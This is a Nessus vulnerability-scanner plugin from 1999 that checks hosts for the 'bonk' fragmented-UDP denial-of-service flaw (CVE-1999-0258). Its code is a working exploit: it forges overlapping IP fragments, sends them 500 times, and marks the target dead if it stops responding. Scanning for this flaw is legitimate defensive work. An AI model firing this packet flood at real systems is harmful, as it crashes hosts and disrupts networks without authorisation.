#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10030);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-1999-0258");
 name["english"] = "Bonk";
 name["francais"] = "Bonk";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to make the remote server crash using the 'bonk' attack. 

An attacker may use this flaw to shut down this server, thus preventing your 
network from working properly.

Solution : contact your operating system vendor for a patch.
Risk factor : High";


 desc["francais"] = "Il s'est avéré possible de faire planter la 
machine distante en utilisant l'attaque 'bonk'. 

Un pirate peut utiliser cette attaque pour empecher votre
réseau de fonctionner normallement.  
Solution : contactez le vendeur de votre OS pour un patch.
Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote host using the 'bonk' attack";
 summary["francais"] = "Plante le serveur distant en utilisant l'attaque 'bonk'";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);

 
 exit(0);
}

#
# The script code starts here
#


if(islocalhost())exit(0);
start_denial();


PADDING = 0x1c;
FRG_CONST = 0x3;
sport = 123;
dport = 321;

addr = this_host();

ip = forge_ip_packet(ip_v  	: 4, 
		     ip_hl 	: 5,
		     ip_len 	: 20 + 8 + PADDING,
		     ip_id 	: 0x455,
		     ip_p 	: IPPROTO_UDP,
		     ip_tos	: 0,
		     ip_ttl 	: 0x40,
		     ip_off 	: IP_MF,
		     ip_src	: addr);

udp1 = forge_udp_packet( ip 	: ip, uh_sport: sport, uh_dport: dport,
			 uh_ulen : 8 + PADDING, data:crap(PADDING));
			 
ip = set_ip_elements(ip : ip, ip_off : FRG_CONST + 1, ip_len : 20 + FRG_CONST);

udp2 = forge_udp_packet(ip : ip,uh_sport : sport, uh_dport : dport,
			uh_ulen : 8 + PADDING, data:crap(PADDING));
			
send_packet(udp1, udp2, pcap_active:FALSE) x 500;						 
sleep(7);  # got false +ves at 5 seconds.
alive = end_denial();
if(!alive){
                set_kb_item(name:"Host/dead", value:TRUE);
                security_hole(port:0, protocol:"udp");
                }
